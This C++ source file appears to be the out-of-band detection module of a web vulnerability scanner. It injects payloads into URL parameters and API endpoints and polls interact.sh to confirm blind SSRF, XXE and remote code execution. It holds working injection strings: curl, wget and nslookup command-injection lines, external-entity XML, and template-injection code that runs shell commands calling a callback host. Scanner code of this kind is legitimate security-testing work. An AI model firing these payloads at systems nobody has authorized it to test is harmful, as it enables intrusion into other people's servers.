#include "oob_server.hpp"
#include <algorithm>
#include <chrono>
#include <iostream>
#include <random>
#include <thread>

namespace apex {

OOBDetector::OOBDetector(HttpClient &http, const Config &config)
    : http_(http), config_(config) {
    // Default to interact.sh (free OOB service)
    oob_server_ = "interact.sh";
}

std::string OOBDetector::generate_token() {
    static thread_local std::mt19937 rng(std::random_device{}());
    std::uniform_int_distribution<int> dist(0, 35);
    const char charset[] = "abcdefghijklmnopqrstuvwxyz0123456789";
    std::string token = "apex";
    for (int i = 0; i < 8; i++) token += charset[dist(rng)];
    token += std::to_string(token_counter_++);
    return token;
}

std::string OOBDetector::get_callback_url(const std::string &token) {
    return "http://" + token + "." + oob_server_;
}

std::string OOBDetector::get_dns_canary(const std::string &token) {
    return token + "." + oob_server_;
}

std::vector<Finding> OOBDetector::inject_and_check(const CrawlResult &crawl) {
    std::vector<Finding> findings;
    if (crawl.urls.empty()) return findings;

    std::string base = crawl.urls[0];
    auto proto = base.find("://");
    if (proto != std::string::npos) {
        auto slash = base.find('/', proto + 3);
        if (slash != std::string::npos) base = base.substr(0, slash);
    }

    std::cout << "  [oob] Injecting blind payloads with callbacks...\n";

    // Collect all params to test
    std::vector<std::pair<std::string, std::string>> targets; // url, param
    for (auto &url : crawl.urls) {
        auto qpos = url.find('?');
        if (qpos == std::string::npos) continue;
        std::string query = url.substr(qpos + 1);
        size_t pos = 0;
        while (pos < query.size()) {
            auto eq = query.find('=', pos);
            if (eq == std::string::npos) break;
            auto amp = query.find('&', eq);
            std::string param = query.substr(pos, eq - pos);
            targets.push_back({url, param});
            pos = (amp != std::string::npos) ? amp + 1 : query.size();
        }
    }

    // Also test common blind injection points
    std::vector<std::string> blind_endpoints = {
        "/api/webhook", "/api/import", "/api/fetch", "/api/proxy",
        "/api/preview", "/api/pdf", "/api/screenshot", "/api/parse",
    };

    // Inject SSRF OOB payloads
    for (auto &[url, param] : targets) {
        std::string token = generate_token();
        auto payloads = get_ssrf_oob_payloads(token);

        for (auto &payload : payloads) {
            // Replace param value
            std::string fuzz_url = url;
            std::string search = param + "=";
            auto spos = fuzz_url.find(search);
            if (spos != std::string::npos) {
                auto vend = fuzz_url.find('&', spos + search.size());
                if (vend == std::string::npos) vend = fuzz_url.size();
                fuzz_url = fuzz_url.substr(0, spos + search.size()) + payload +
                           (vend < fuzz_url.size() ? fuzz_url.substr(vend) : "");
            }
            http_.get(fuzz_url);

            pending_.push_back({token, "ssrf", url, param, ""});
        }
    }

    // Inject XXE payloads on endpoints that accept XML
    for (auto &endpoint : blind_endpoints) {
        std::string token = generate_token();
        auto xxe_payloads = get_xxe_oob_payloads(token);
        for (auto &payload : xxe_payloads) {
            http_.post(base + endpoint, payload, "application/xml");
            pending_.push_back({token, "xxe", base + endpoint, "", ""});
        }
    }

    // Inject RCE payloads (blind command execution with DNS/HTTP callback)
    for (auto &[url, param] : targets) {
        std::string token = generate_token();
        auto rce_payloads = get_rce_oob_payloads(token);
        for (auto &payload : rce_payloads) {
            std::string fuzz_url = url;
            std::string search = param + "=";
            auto spos = fuzz_url.find(search);
            if (spos != std::string::npos) {
                auto vend = fuzz_url.find('&', spos + search.size());
                if (vend == std::string::npos) vend = fuzz_url.size();
                fuzz_url = fuzz_url.substr(0, spos + search.size()) + payload +
                           (vend < fuzz_url.size() ? fuzz_url.substr(vend) : "");
            }
            http_.get(fuzz_url);
            pending_.push_back({token, "rce", url, param, ""});
        }
    }

    std::cout << "  [oob] " << pending_.size() << " payloads injected, waiting for callbacks...\n";

    // Wait and poll for callbacks
    std::this_thread::sleep_for(std::chrono::seconds(5));

    auto callbacks = poll_callbacks();
    for (auto &cb : callbacks) {
        // Find which pending payload this callback belongs to
        for (auto &p : pending_) {
            if (p.token == cb.token && !p.triggered) {
                p.triggered = true;
                Finding f;
                f.url = p.target_url;
                f.param = p.param;

                if (p.payload_type == "ssrf") {
                    f.type = "Blind SSRF (OOB Confirmed)";
                    f.severity = "critical";
                    f.confidence = 0.95;
                    f.cwe_id = "CWE-918";
                    f.cvss_score = 9.1;
                } else if (p.payload_type == "xxe") {
                    f.type = "Blind XXE (OOB Confirmed)";
                    f.severity = "critical";
                    f.confidence = 0.95;
                    f.cwe_id = "CWE-611";
                    f.cvss_score = 9.1;
                } else if (p.payload_type == "rce") {
                    f.type = "Blind RCE (OOB Confirmed)";
                    f.severity = "critical";
                    f.confidence = 0.99;
                    f.cwe_id = "CWE-78";
                    f.cvss_score = 10.0;
                } else if (p.payload_type == "ssti") {
                    f.type = "Blind SSTI (OOB Confirmed)";
                    f.severity = "critical";
                    f.confidence = 0.95;
                    f.cwe_id = "CWE-1336";
                    f.cvss_score = 9.8;
                }

                f.evidence = "OOB callback received from " + cb.source_ip +
                             (cb.is_dns ? " (DNS)" : " (HTTP)");
                f.detail = "Blind " + p.payload_type + " confirmed via out-of-band callback";
                findings.push_back(f);
                break;
            }
        }
    }

    if (!findings.empty()) {
        std::cout << "  [oob] " << findings.size() << " CONFIRMED blind vulnerabilities!\n";
    }
    return findings;
}

std::vector<std::string> OOBDetector::get_ssrf_oob_payloads(const std::string &token) {
    std::string cb = get_callback_url(token);
    std::string dns = get_dns_canary(token);
    return {
        cb,
        "http://" + dns,
        "https://" + dns,
        cb + "/ssrf",
        "http://" + dns + ":80/",
        "http://" + dns + ":443/",
    };
}

std::vector<std::string> OOBDetector::get_xxe_oob_payloads(const std::string &token) {
    std::string dns = get_dns_canary(token);
    std::string cb = get_callback_url(token);
    return {
        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"" + cb + "\">]><root>&xxe;</root>",
        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"" + cb + "/dtd\"> %xxe;]><root/>",
        "<?xml version=\"1.0\"?><!DOCTYPE foo SYSTEM \"" + cb + "/dtd\"><root/>",
    };
}

std::vector<std::string> OOBDetector::get_rce_oob_payloads(const std::string &token) {
    std::string dns = get_dns_canary(token);
    std::string cb = get_callback_url(token);
    return {
        ";curl " + cb + "/rce",
        "|curl " + cb + "/rce",
        "$(curl " + cb + "/rce)",
        "`curl " + cb + "/rce`",
        ";nslookup " + dns,
        "|nslookup " + dns,
        "$(nslookup " + dns + ")",
        ";wget " + cb + "/rce -O /dev/null",
        "& ping -c 1 " + dns,
    };
}

std::vector<std::string> OOBDetector::get_ssti_oob_payloads(const std::string &token) {
    std::string cb = get_callback_url(token);
    return {
        "{{''.__class__.__mro__[1].__subclasses__()[157]('curl " + cb + "',shell=True)}}",
        "${T(java.lang.Runtime).getRuntime().exec('curl " + cb + "')}",
        "<%= `curl " + cb + "` %>",
    };
}

bool OOBDetector::check_callback(const std::string &token) {
    // Poll interact.sh or custom server for callback
    std::string poll_url = "https://poll." + oob_server_ + "/" + token;
    auto resp = http_.get(poll_url);
    return resp.status_code == 200 && resp.body.find("\"data\"") != std::string::npos;
}

std::vector<OOBResult> OOBDetector::poll_callbacks() {
    std::vector<OOBResult> results;

    // Check each pending token
    for (auto &p : pending_) {
        if (p.triggered) continue;
        if (check_callback(p.token)) {
            OOBResult r;
            r.token = p.token;
            r.is_http = true;
            results.push_back(r);
        }
    }
    return results;
}

} // namespace apex
